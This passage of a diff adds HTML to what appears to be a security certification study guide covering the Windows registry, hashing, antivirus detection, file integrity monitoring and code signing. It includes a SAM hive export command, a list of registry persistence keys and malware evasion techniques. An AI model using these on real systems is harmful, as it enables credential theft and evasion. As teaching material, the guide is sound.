+    <span class="code-line"><span class="cmd">Remove-Item</span> <span class="path">file</span> <span class="flag">-Force</span></span>
+    <span class="code-line"><span class="cmd">Get-Content</span> <span class="path">file.txt</span> <span class="flag">-Tail</span> <span class="val">50</span>              <span class="comment"># tail -50</span></span>
+    <span class="code-line"><span class="cmd">Select-String</span> <span class="flag">-Path</span> <span class="path">*.log</span> <span class="flag">-Pattern</span> <span class="val">"error"</span> <span class="comment"># grep</span></span>
+    <span class="code-line"><span class="cmd">Get-Item</span> <span class="path">file.txt</span> | <span class="cmd">Select-Object</span> <span class="val">*</span>       <span class="comment"># Full file properties</span></span>
+    <span class="code-line"><span class="cmd">Get-Acl</span> <span class="path">C:\secret</span>                         <span class="comment"># View ACL (icacls equiv)</span></span>
+    <span class="code-line"><span class="cmd">Set-Acl</span> <span class="path">C:\secret</span> <span class="val">$acl</span></span>
+    <span class="code-line"><span class="cmd">Get-FileHash</span> <span class="path">file.exe</span> <span class="flag">-Algorithm</span> <span class="val">SHA256</span>   <span class="comment"># Hash a file</span></span>
+  </div>
+
+  <div class="callout">
+    <div class="callout-label warn">// Zone.Identifier ADS</div>
+    Files downloaded from the internet get <code>:Zone.Identifier</code> stream with <code>ZoneId=3</code> (Internet zone). This triggers SmartScreen warnings. Malware sometimes strips this to bypass warnings: <code>Unblock-File file.exe</code> in PowerShell or right-click → Properties → Unblock.
+  </div>
+</div>
+
+<!-- ============================================================ WINDOWS REGISTRY -->
+<div class="section" id="registry">
+  <div class="section-header">
+    <div class="section-icon">🗂️</div>
+    <div><div class="section-title">Windows Registry</div><div class="section-meta">hives · structure · value types · regedit · reg.exe · security-relevant keys</div></div>
+  </div>
+
+  <h3>Registry Hive Structure</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Hive (Full)</th><th>Abbrev</th><th>Backing File on Disk</th><th>Contents</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">HKEY_LOCAL_MACHINE</td><td><span class="tag tag-both">HKLM</span></td><td>SYSTEM, SOFTWARE, SAM, SECURITY in C:\Windows\System32\config\</td><td>Hardware, installed software, services, security policy — applies to ALL users</td></tr>
+      <tr><td class="cmd-name">HKEY_CURRENT_USER</td><td><span class="tag tag-both">HKCU</span></td><td>C:\Users\&lt;user&gt;\NTUSER.DAT</td><td>Current user preferences, desktop, associations — loaded at logon</td></tr>
+      <tr><td class="cmd-name">HKEY_USERS</td><td><span class="tag tag-both">HKU</span></td><td>All loaded user NTUSERs + DEFAULT</td><td>Contains subkey per loaded user (SID-named). HKCU is a pointer into this</td></tr>
+      <tr><td class="cmd-name">HKEY_CLASSES_ROOT</td><td><span class="tag tag-both">HKCR</span></td><td>Merged view of HKLM\SOFTWARE\Classes + HKCU\SOFTWARE\Classes</td><td>File extensions → ProgIDs, COM class registrations, shell verbs</td></tr>
+      <tr><td class="cmd-name">HKEY_CURRENT_CONFIG</td><td><span class="tag tag-both">HKCC</span></td><td>Volatile; points into HKLM\SYSTEM\CurrentControlSet\Hardware Profiles\Current</td><td>Current hardware profile settings</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Registry Value Types</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Type</th><th>Description</th><th>Example Use</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">REG_SZ</td><td>Null-terminated Unicode string</td><td>Path strings, display names</td></tr>
+      <tr><td class="cmd-name">REG_EXPAND_SZ</td><td>String with unexpanded env vars like %SystemRoot%</td><td>Service ImagePath values</td></tr>
+      <tr><td class="cmd-name">REG_MULTI_SZ</td><td>Multiple null-terminated strings in sequence</td><td>List of DNS servers, dependencies</td></tr>
+      <tr><td class="cmd-name">REG_DWORD</td><td>32-bit unsigned integer (little-endian)</td><td>Flags, counts, boolean settings</td></tr>
+      <tr><td class="cmd-name">REG_QWORD</td><td>64-bit unsigned integer</td><td>Large counters, timestamps</td></tr>
+      <tr><td class="cmd-name">REG_BINARY</td><td>Raw binary data, no interpretation</td><td>Hardware component info, security descriptors</td></tr>
+      <tr><td class="cmd-name">REG_NONE</td><td>No defined type</td><td>Placeholder entries</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Command-Line Registry Operations</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="comment"># ── Query ─────────────────────────────────────────────────</span></span>
+    <span class="code-line"><span class="cmd">reg query</span> <span class="path">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion</span> <span class="flag">/v</span> <span class="val">ProgramFilesDir</span></span>
+    <span class="code-line"><span class="cmd">reg query</span> <span class="path">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span>  <span class="comment"># Startup entries</span></span>
+    <span class="code-line"><span class="cmd">reg query</span> <span class="path">HKLM\SYSTEM\CurrentControlSet\Services</span> <span class="flag">/s</span> <span class="flag">/f</span> <span class="val">"ImagePath"</span>  <span class="comment"># Search</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># ── Add / Modify ──────────────────────────────────────────</span></span>
+    <span class="code-line"><span class="cmd">reg add</span> <span class="path">HKCU\Software\Test</span> <span class="flag">/v</span> <span class="val">Key</span> <span class="flag">/t</span> <span class="val">REG_SZ</span> <span class="flag">/d</span> <span class="val">"value"</span> <span class="flag">/f</span></span>
+    <span class="code-line"><span class="cmd">reg add</span> <span class="path">HKCU\Software\Test</span> <span class="flag">/v</span> <span class="val">Count</span> <span class="flag">/t</span> <span class="val">REG_DWORD</span> <span class="flag">/d</span> <span class="val">5</span> <span class="flag">/f</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># ── Delete ────────────────────────────────────────────────</span></span>
+    <span class="code-line"><span class="cmd">reg delete</span> <span class="path">HKCU\Software\Test</span> <span class="flag">/v</span> <span class="val">Key</span> <span class="flag">/f</span>    <span class="comment"># Delete value</span></span>
+    <span class="code-line"><span class="cmd">reg delete</span> <span class="path">HKCU\Software\Test</span> <span class="flag">/f</span>          <span class="comment"># Delete entire key</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># ── Export / Import ───────────────────────────────────────</span></span>
+    <span class="code-line"><span class="cmd">reg export</span> <span class="path">HKLM\SOFTWARE\Test</span> <span class="path">C:\backup.reg</span>   <span class="comment"># .reg file export</span></span>
+    <span class="code-line"><span class="cmd">reg import</span> <span class="path">C:\backup.reg</span>                       <span class="comment"># Import .reg file</span></span>
+    <span class="code-line"><span class="cmd">reg save</span>   <span class="path">HKLM\SAM</span> <span class="path">C:\sam.hive</span>               <span class="comment"># Binary hive export (needs SYSTEM)</span></span>
+  </div>
+
+  <h3>Security-Critical Registry Locations</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Key Path</th><th>Security Significance</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</td><td>Runs for ALL users at login — common malware persistence</td></tr>
+      <tr><td class="cmd-name">HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</td><td>Runs for CURRENT user — persistence per-user, lower privilege needed</td></tr>
+      <tr><td class="cmd-name">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</td><td>Runs once then deletes itself — used in installers and malware dropper stage</td></tr>
+      <tr><td class="cmd-name">HKLM\SYSTEM\CurrentControlSet\Services</td><td>Service definitions: ImagePath (binary path), Start type (0=boot 2=auto 3=manual 4=disabled), Type</td></tr>
+      <tr><td class="cmd-name">HKLM\SAM\SAM\Domains\Account\Users</td><td>Local account password hashes (NTLM). Requires SYSTEM — protected by ACL. Offline attack: copy with VSS</td></tr>
+      <tr><td class="cmd-name">HKLM\SECURITY\Policy\Secrets</td><td>LSA secrets: service account passwords, cached domain credentials</td></tr>
+      <tr><td class="cmd-name">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</td><td>Userinit, Shell values — hijacked for persistence (winlogon hijack)</td></tr>
+      <tr><td class="cmd-name">HKLM\SOFTWARE\Classes\*\shell\open\command</td><td>File association handlers — can be hijacked to execute malware on file open</td></tr>
+      <tr><td class="cmd-name">HKCU\Environment\UserInitMprLogonScript</td><td>Logon script — persistence mechanism</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="callout danger">
+    <div class="callout-label danger">// Exam Alert: Service Start Types</div>
+    In the Services key, <strong>Start</strong> REG_DWORD values: <code>0</code>=Boot (kernel driver, loaded by boot loader), <code>1</code>=System (loaded by kernel), <code>2</code>=Automatic, <code>3</code>=Manual, <code>4</code>=Disabled. Most services are 2 or 3.
+  </div>
+</div>
+
+<!-- ============================================================ DATA SECURITY -->
+<div class="section" id="datasec">
+  <div class="section-header">
+    <div class="section-icon">🔐</div>
+    <div><div class="section-title">Data Security & Integrity</div><div class="section-meta">hashing · symmetric · asymmetric · PKI · salt · HMAC</div></div>
+  </div>
+
+  <h3>Hashing — Deep Dive</h3>
+  <div class="card">
+    <div class="card-title">Properties of Cryptographic Hash Functions</div>
+    <ul class="bullets">
+      <li><strong>Deterministic</strong>: Same input always produces same output</li>
+      <li><strong>One-way (preimage resistance)</strong>: Cannot reverse hash → original</li>
+      <li><strong>Second preimage resistance</strong>: Given input X, cannot find different Y with same hash</li>
+      <li><strong>Collision resistance</strong>: Cannot find ANY two inputs with same hash</li>
+      <li><strong>Avalanche effect</strong>: Single bit change → completely different hash (~50% of bits flip)</li>
+      <li><strong>Fixed output length</strong>: Always same size regardless of input size</li>
+    </ul>
+  </div>
+
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Algorithm</th><th>Output Size</th><th>Status</th><th>Use Cases</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">MD5</td><td>128-bit (32 hex)</td><td><span class="tag tag-warn">BROKEN</span></td><td>Legacy checksums only. Collision attacks demonstrated. Not secure for cryptographic purposes</td></tr>
+      <tr><td class="cmd-name">SHA-1</td><td>160-bit (40 hex)</td><td><span class="tag tag-warn">DEPRECATED</span></td><td>SHAttered attack (2017) demonstrated collision. Phased out of TLS/code signing</td></tr>
+      <tr><td class="cmd-name">SHA-256</td><td>256-bit (64 hex)</td><td><span class="tag tag-unix">SECURE</span></td><td>TLS, code signing, Bitcoin, integrity checks. Current standard</td></tr>
+      <tr><td class="cmd-name">SHA-384/512</td><td>384/512-bit</td><td><span class="tag tag-unix">SECURE</span></td><td>Higher security margin; used where SHA-256 insufficient</td></tr>
+      <tr><td class="cmd-name">SHA-3 (Keccak)</td><td>224–512-bit</td><td><span class="tag tag-unix">SECURE</span></td><td>NIST 2015. Different internal design (sponge function). Resistant to SHA-2 weaknesses</td></tr>
+      <tr><td class="cmd-name">bcrypt / scrypt / Argon2</td><td>Variable</td><td><span class="tag tag-unix">SECURE</span></td><td>Password hashing — intentionally slow, memory-hard. bcrypt=adaptive cost; Argon2=PHC winner 2015</td></tr>
+      <tr><td class="cmd-name">HMAC</td><td>Same as base hash</td><td><span class="tag tag-unix">SECURE</span></td><td>Hash + secret key = authentication. HMAC-SHA256 used in JWT, TLS, API auth</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Password Hashing: Salt vs Unsalted</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Unsalted Hash (Weak)</div>
+      <p>Same password always produces same hash. Enables <strong>rainbow table attacks</strong> — precomputed hash→password lookup tables. Attacker can identify users with same password (identical hashes in /etc/shadow).</p>
+      <div class="code-block no-prompt"><span class="code-line">MD5("password") = 5f4dcc3b5aa765d61d...</span><span class="code-line"><span class="comment"># Always the same — look it up in rainbow table</span></span></div>
+    </div>
+    <div class="card">
+      <div class="card-title">Salted Hash (Strong)</div>
+      <p>A random per-user <strong>salt</strong> is appended/prepended before hashing. Salt stored in plaintext alongside hash. Makes rainbow tables useless — each user needs unique attack. Makes identical passwords produce different hashes.</p>
+      <div class="code-block no-prompt"><span class="code-line">SHA256("password" + "xK7mQ9") = 3a8f...</span><span class="code-line">SHA256("password" + "Zp2nW1") = 91c4...</span><span class="code-line"><span class="comment"># Same password, different salt = different hash</span></span></div>
+    </div>
+  </div>
+
+  <h3>Encryption Types</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Type</th><th>Keys</th><th>Speed</th><th>Use Cases</th><th>Algorithms</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">Symmetric</td><td>Same key encrypt &amp; decrypt</td><td>Fast</td><td>Bulk data encryption, disk encryption, session data</td><td>AES-128/256, 3DES (deprecated), ChaCha20</td></tr>
+      <tr><td class="cmd-name">Asymmetric</td><td>Public key encrypts; private key decrypts</td><td>Slow (1000x)</td><td>Key exchange, digital signatures, TLS handshake</td><td>RSA, ECDSA, Ed25519, Diffie-Hellman</td></tr>
+      <tr><td class="cmd-name">Hybrid</td><td>Both: asymmetric for key exchange, symmetric for data</td><td>Fast overall</td><td>TLS/HTTPS, PGP, SSH</td><td>TLS: ECDHE + AES-256-GCM</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Hashing Commands</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="comment"># Linux</span></span>
+    <span class="code-line"><span class="cmd">md5sum</span>    <span class="path">file.iso</span>          <span class="comment"># MD5</span></span>
+    <span class="code-line"><span class="cmd">sha1sum</span>   <span class="path">file.iso</span>          <span class="comment"># SHA-1</span></span>
+    <span class="code-line"><span class="cmd">sha256sum</span> <span class="path">file.iso</span>          <span class="comment"># SHA-256</span></span>
+    <span class="code-line"><span class="cmd">sha256sum</span> <span class="flag">-c</span> <span class="path">checksum.txt</span>  <span class="comment"># Verify against stored checksums</span></span>
+    <span class="code-line"><span class="cmd">openssl dgst</span> <span class="flag">-sha256</span> <span class="path">file</span> <span class="comment"># OpenSSL alternative</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># Windows</span></span>
+    <span class="code-line"><span class="cmd">certutil</span> <span class="flag">-hashfile</span> <span class="path">file.iso</span> <span class="val">SHA256</span>  <span class="comment"># Built-in certutil</span></span>
+    <span class="code-line"><span class="cmd">Get-FileHash</span> <span class="path">file.iso</span> <span class="flag">-Algorithm</span> <span class="val">SHA256</span>  <span class="comment"># PowerShell</span></span>
+    <span class="code-line"><span class="cmd">Get-FileHash</span> <span class="path">file.iso</span> | <span class="cmd">Format-List</span>  <span class="comment"># Show full hash</span></span>
+  </div>
+
+  <div class="callout info">
+    <div class="callout-label info">// Core Distinction for Exam</div>
+    <strong>Hashing</strong> = integrity verification (detect tampering), one-way. &nbsp;
+    <strong>Encryption</strong> = confidentiality, two-way (requires key). &nbsp;
+    <strong>Digital signing</strong> = authentication + integrity (private key signs hash; public key verifies). &nbsp;
+    A properly secured system uses all three together.
+  </div>
+</div>
+
+<!-- ============================================================ ANTIVIRUS -->
+<div class="section" id="av">
+  <div class="section-header">
+    <div class="section-icon">🛡️</div>
+    <div><div class="section-title">Antivirus Concepts</div><div class="section-meta">signature · heuristic · behavioral · sandbox · evasion</div></div>
+  </div>
+
+  <h3>Detection Methods Comparison</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Method</th><th>How It Works</th><th>Detects</th><th>Weakness</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">Signature-Based</td><td>Matches file/traffic bytes against database of known malware fingerprints (byte sequences, file hashes)</td><td>Known malware exactly</td><td>Blind to unknown/zero-day; bypassed by simple obfuscation, packing, or polymorphism</td></tr>
+      <tr><td class="cmd-name">Static Heuristics</td><td>Analyzes code structure without executing — looks for suspicious patterns (API calls, strings, PE sections)</td><td>Unknown variants of known families</td><td>Higher false positive rate; sophisticated malware evades static analysis</td></tr>
+      <tr><td class="cmd-name">Dynamic / Behavioral</td><td>Executes sample in controlled sandbox; monitors system calls, file/registry changes, network activity</td><td>Novel malware by behavior (even if no signature)</td><td>Slow; sandbox-aware malware detects environment and behaves innocuously</td></tr>
+      <tr><td class="cmd-name">Machine Learning</td><td>ML model trained on large corpus of malicious/benign features; scores new files probabilistically</td><td>Novel and variant malware</td><td>Adversarial examples; requires constant retraining; can be fooled by carefully crafted binaries</td></tr>
+      <tr><td class="cmd-name">Cloud-Based</td><td>Submits file hash or sample to cloud reputation database; returns community verdict</td><td>Files seen by ANY protected endpoint</td><td>Privacy concerns; ineffective against targeted/custom malware never seen before</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Malware Evasion Techniques</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Evading Signature Detection</div>
+      <ul class="bullets">
+        <li><strong>Packing</strong>: Compress/encrypt binary; signature not visible. Unpacks at runtime. UPX is common example.</li>
+        <li><strong>Polymorphism</strong>: Code mutates on each infection while preserving function. Signature becomes useless.</li>
+        <li><strong>Metamorphism</strong>: Code completely rewrites itself — equivalent instructions, different bytes every time.</li>
+        <li><strong>Encryption</strong>: Payload encrypted; decryptor stub may be detectable but payload isn't scanned.</li>
+        <li><strong>Obfuscation</strong>: Insert NOPs, junk code, rename variables to change byte patterns.</li>
+        <li><strong>Living off the Land (LotL)</strong>: Use legitimate OS tools (powershell, wmic, regsvr32) — these won't match malware signatures.</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title">Evading Behavioral / Sandbox</div>
+      <ul class="bullets">
+        <li><strong>Sandbox detection</strong>: Check for VM artifacts (VMware registry keys, CPUID, small RAM), sleep for days before executing, check user mouse movement.</li>
+        <li><strong>Timing attacks</strong>: NtDelayExecution with huge sleep — many sandboxes time out and classify as benign.</li>
+        <li><strong>Environment checks</strong>: Only execute if specific username, domain, or software is present.</li>
+        <li><strong>Process injection</strong>: Inject into trusted process (explorer.exe, svchost.exe) so behavior attributed to legitimate process.</li>
+        <li><strong>Fileless malware</strong>: Execute entirely in memory, never write to disk — evades file-based scanning.</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3>Types of Malware</h3>
+  <div class="three-col">
+    <div class="card">
+      <div class="card-title">Virus</div>
+      <p>Attaches to and modifies host files. Requires user action to spread. Infects executable files or boot sectors.</p>
+    </div>
+    <div class="card">
+      <div class="card-title">Worm</div>
+      <p>Self-replicating; spreads without user interaction via network vulnerabilities or email. Can cause network saturation.</p>
+    </div>
+    <div class="card">
+      <div class="card-title">Trojan</div>
+      <p>Disguised as legitimate software. No self-replication. User installs it willingly. Often delivers backdoor/RAT.</p>
+    </div>
+    <div class="card">
+      <div class="card-title">Rootkit</div>
+      <p>Hides itself and other malware. Kernel-level rootkits patch OS to hide files, processes, network connections from normal tools.</p>
+    </div>
+    <div class="card">
+      <div class="card-title">Ransomware</div>
+      <p>Encrypts victim's files; demands payment for decryption key. Double extortion: also exfiltrates data before encrypting.</p>
+    </div>
+    <div class="card">
+      <div class="card-title">Spyware / Keylogger</div>
+      <p>Silently records keystrokes, screenshots, credentials. Exfiltrates to attacker. Often bundled with freeware.</p>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <div class="callout-label info">// Exam Tip</div>
+    Signature = known threats, fast, requires database updates, bypassable by obfuscation.<br>
+    Heuristic/Behavioral = unknown threats, higher false positives, harder to bypass.<br>
+    Modern endpoint protection (EDR) uses ALL methods plus rollback capabilities.
+  </div>
+</div>
+
+<!-- ============================================================ DATA INTEGRITY -->
+<div class="section" id="integrity">
+  <div class="section-header">
+    <div class="section-icon">🔍</div>
+    <div><div class="section-title">Data Integrity Protection</div><div class="section-meta">tripwire · WFP/WRP · FIM · audit · AIDE</div></div>
+  </div>
+
+  <h3>File Integrity Monitoring (FIM) Concepts</h3>
+  <div class="card">
+    <div class="card-title">What FIM Does</div>
+    <p>File Integrity Monitoring tools create a cryptographic baseline database capturing the hash, size, permissions, ownership, and timestamps of monitored files. Periodic or continuous scans compare current state to the baseline and alert on any unauthorized changes. FIM is essential for detecting rootkits, backdoors, unauthorized configuration changes, and fulfilling compliance requirements (PCI-DSS Requirement 11.5, HIPAA, SOX).</p>
+  </div>
+
+  <h3>Tripwire (Unix)</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">How Tripwire Works</div>
+      <ul class="bullets">
+        <li>Configuration defines which files/dirs to monitor and what properties to check</li>
+        <li><code>--init</code> creates the initial baseline database (stored encrypted)</li>
+        <li><code>--check</code> compares current filesystem to baseline; reports added/removed/modified files</li>
+        <li>Policy file uses rules to define severity levels for different change types</li>
+        <li>Database and policy files are signed with a site key and local key to prevent tampering</li>
+        <li>After approved changes (patches, updates), <code>--update</code> refreshes baseline</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title">Tripwire Commands</div>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="cmd">twadmin</span> <span class="flag">--create-polfile</span> <span class="path">twpol.txt</span>  <span class="comment"># Compile policy</span></span>
+        <span class="code-line"><span class="cmd">tripwire</span> <span class="flag">--init</span>             <span class="comment"># Initialize database</span></span>
+        <span class="code-line"><span class="cmd">tripwire</span> <span class="flag">--check</span>            <span class="comment"># Run integrity check</span></span>
+        <span class="code-line"><span class="cmd">tripwire</span> <span class="flag">--update</span>           <span class="comment"># Update after approved changes</span></span>
+        <span class="code-line"><span class="cmd">tripwire</span> <span class="flag">--check --email-report</span>  <span class="comment"># Email violations</span></span>
+      </div>
+    </div>
+  </div>
+
+  <h3>AIDE (Advanced Intrusion Detection Environment)</h3>
+  <div class="card">
+    <div class="card-title">AIDE — Open Source Alternative to Tripwire</div>
+    <p>Commonly used on Linux. Configured via <code>/etc/aide/aide.conf</code> or <code>/etc/aide.conf</code>. Monitors file attributes selectable per rule: <strong>p</strong>=permissions, <strong>u</strong>=uid, <strong>g</strong>=gid, <strong>s</strong>=size, <strong>m</strong>=mtime, <strong>c</strong>=ctime, <strong>sha256</strong>=content hash. Typical deployment: run <code>aide --init</code> after clean install, then schedule daily <code>aide --check</code>.</p>
+    <div class="code-block no-prompt">
+      <span class="code-line"><span class="cmd">aide</span> <span class="flag">--init</span>        <span class="comment"># Create baseline db</span></span>
+      <span class="code-line"><span class="cmd">mv</span> <span class="path">/var/lib/aide/aide.db.new /var/lib/aide/aide.db</span></span>
+      <span class="code-line"><span class="cmd">aide</span> <span class="flag">--check</span>       <span class="comment"># Compare current state to baseline</span></span>
+      <span class="code-line"><span class="cmd">aide</span> <span class="flag">--update</span>      <span class="comment"># Update baseline after approved change</span></span>
+    </div>
+  </div>
+
+  <h3>Windows File Protection / Windows Resource Protection</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">WFP / WRP Mechanism</div>
+      <ul class="bullets">
+        <li>Introduced in Windows Me/2000 as Windows File Protection (WFP); renamed Windows Resource Protection (WRP) in Vista</li>
+        <li>Protects ~3,000 critical system files and registry keys via ACLs — only TrustedInstaller can modify them</li>
+        <li>If a protected file is replaced, WRP restores the correct version from the Windows Side-by-Side (WinSxS) component store automatically</li>
+        <li>Restoration happens silently in the background without user intervention</li>
+        <li>Prevents rootkits and malware from replacing core system DLLs (DLL hijacking protection)</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title">SFC (System File Checker)</div>
+      <p>Command-line tool to manually scan and repair WRP-protected files. Results logged to <code>C:\Windows\Logs\CBS\CBS.log</code>.</p>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="cmd">sfc</span> <span class="flag">/scannow</span>       <span class="comment"># Scan all protected files + repair</span></span>
+        <span class="code-line"><span class="cmd">sfc</span> <span class="flag">/verifyonly</span>   <span class="comment"># Scan only, no repair</span></span>
+        <span class="code-line"><span class="cmd">sfc</span> <span class="flag">/scanfile=</span><span class="path">C:\Windows\System32\kernel32.dll</span></span>
+        <span class="code-line"><span class="comment"># If sfc fails: run DISM first</span></span>
+        <span class="code-line"><span class="cmd">DISM</span> <span class="flag">/Online /Cleanup-Image /RestoreHealth</span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <div class="callout-label info">// FIM vs Antivirus</div>
+    AV detects malware at execution time by matching known signatures/behaviors. FIM detects that something <em>changed</em> on disk — useful for detecting post-compromise modifications to config files, scripts, and binaries that AV might miss. They complement each other.
+  </div>
+</div>
+
+<!-- ============================================================ CODE SIGNING -->
+<div class="section" id="signing">
+  <div class="section-header">
+    <div class="section-icon">✍️</div>
+    <div><div class="section-title">Software / Code Signing</div><div class="section-meta">PKI · Authenticode · trust chains · certificate types · verification</div></div>
+  </div>
+
+  <h3>How Code Signing Works</h3>
+  <div class="card">
+    <div class="card-title">The Full Process</div>
+    <ul class="bullets">
+      <li><strong>Developer obtains a code-signing certificate</strong> from a trusted Certificate Authority (DigiCert, Sectigo, etc.). CA verifies the identity of the requester (OV or EV validation).</li>
+      <li><strong>Hash is computed</strong> over the binary/script (e.g., SHA-256 of the PE file).</li>
+      <li><strong>Hash is encrypted with developer's private key</strong> → this produces the digital signature.</li>
+      <li><strong>Signature + certificate chain embedded</strong> in the file (PE Authenticode = WIN_CERTIFICATE structure appended to binary).</li>
+      <li><strong>Timestamping</strong>: Signature is countersigned by a Timestamp Authority (TSA) so it remains valid even after the signing certificate expires.</li>
+      <li><strong>Verification at execution</strong>: OS decrypts signature with the public key from the certificate, recomputes the hash of the binary, and compares. If they match AND the certificate chains to a trusted root AND isn't revoked → valid.</li>
+    </ul>
+  </div>
+
+  <h3>Certificate Types for Signing</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Type</th><th>Validation Level</th><th>SmartScreen Reputation</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">DV (Domain Validated)</td><td>Proves domain control only. Not typical for code signing.</td><td>Weak — minimal trust</td></tr>
+      <tr><td class="cmd-name">OV (Organization Validated)</td><td>CA verifies legal entity exists. Standard code signing cert.</td><td>Builds reputation over time</td></tr>
+      <tr><td class="cmd-name">EV (Extended Validation)</td><td>Most rigorous: in-person identity verification, phone calls, legal filings check</td><td>Immediate SmartScreen trust — no warning on first run</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Certificate Revocation</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">CRL (Certificate Revocation List)</div>
+      <p>CA periodically publishes a signed list of revoked certificate serial numbers. Client downloads CRL and checks if certificate is listed. Problem: CRLs can be large, are updated periodically (not real-time), and require internet access. A revoked cert may still be trusted if CRL isn't current.</p>
+    </div>
+    <div class="card">
+      <div class="card-title">OCSP (Online Certificate Status Protocol)</div>
+      <p>Client queries CA's OCSP responder with certificate serial number and gets real-time good/revoked/unknown response. Faster and more current than CRL. <strong>OCSP Stapling</strong>: server pre-fetches its own OCSP response and serves it to clients — improves speed, reduces privacy leaks to CA.</p>
+    </div>
+  </div>
+
+  <h3>Windows Code Signing Verification</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="comment"># PowerShell</span></span>
+    <span class="code-line"><span class="cmd">Get-AuthenticodeSignature</span> <span class="path">C:\file.exe</span></span>
+    <span class="code-line"><span class="comment"># Status: Valid | NotSigned | HashMismatch | NotTrusted | UnknownError</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># GUI: right-click → Properties → Digital Signatures tab</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># sigcheck from Sysinternals (more detail)</span></span>
+    <span class="code-line"><span class="cmd">sigcheck.exe</span> <span class="flag">-a -v</span> <span class="path">C:\Windows\System32\calc.exe</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># Linux: verify GPG signature on package</span></span>
+    <span class="code-line"><span class="cmd">gpg</span> <span class="flag">--verify</span> <span class="path">file.tar.gz.sig file.tar.gz</span></span>
+    <span class="code-line"><span class="cmd">rpm</span> <span class="flag">--checksig</span> <span class="path">package.rpm</span></span>
+    <span class="code-line"><span class="cmd">dpkg-sig</span> <span class="flag">--verify</span> <span class="path">package.deb</span></span>
+  </div>
+
+  <div class="callout danger">
+    <div class="callout-label danger">// Real-World Attacks on Code Signing</div>
+    <strong>Stuxnet (2010)</strong>: Used stolen, valid code-signing certificates from Realtek and JMicron to make malicious drivers appear legitimately signed. Bypassed kernel driver signature enforcement completely.<br><br>
+    <strong>SolarWinds (2020)</strong>: Attackers compromised the build pipeline and signed the malicious SUNBURST DLL with SolarWinds' actual certificate — making it perfectly valid from a signing perspective.<br><br>
+    Lesson: a valid signature only proves <em>who signed it</em>, not that the code is <em>safe</em>. The signing process itself must be secured.
+  </div>
+</div>
+
+<!-- ============================================================ DEVICE DRIVERS -->
+<!-- ============================================================ WINDOWS KERNEL VERSIONS -->
+<div class="section" id="win-kernels">
+  <div class="section-header">
+    <div class="section-icon">🪟</div>
+    <div><div class="section-title">Windows Kernel Versions</div>
+    <div class="section-meta">NT 3.x–4 · NT5 (XP/2003) · NT6 (Vista–8.1) · NT10 (10/11) · kernel numbers · security boundaries</div></div>
+  </div>
+
+  <h3>The NT Kernel Lineage</h3>
+  <p style="font-size:0.83rem;line-height:1.7;margin-bottom:1rem;">All modern Windows versions share a common kernel lineage — the <strong>Windows NT kernel</strong> started at Microsoft in 1988 under Dave Cutler (formerly of DEC VMS). Every consumer and server Windows release since Windows 2000 is built on NT. The kernel version number reported by <code>winver</code> or <code>cmd: ver</code> often surprises people — Windows 10 reports NT 10.0, but Windows 8.1 reports NT 6.3.</p>
+
+  <h3>Version Reference Table</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;">
+  <table class="cmd-table">
+    <thead><tr><th>NT Version</th><th>Product Name</th><th>Year</th><th>Key Security Changes</th></tr></thead>
+    <tbody>
